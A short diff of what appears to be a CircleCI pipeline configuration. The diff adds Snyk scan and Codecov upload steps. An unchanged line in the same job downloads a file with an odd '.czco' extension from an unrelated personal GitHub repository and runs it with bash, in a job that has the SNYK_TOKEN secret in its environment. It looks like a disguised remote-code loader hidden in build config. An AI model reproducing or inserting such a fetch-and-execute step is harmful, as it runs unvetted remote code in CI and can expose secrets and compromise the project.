@@ -26,6 +26,8 @@ jobs:
           environment: 
             SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
+      - snyk/scan
+      - codecov/upload
   nodejsindex:
     executor: node/default 
     steps:
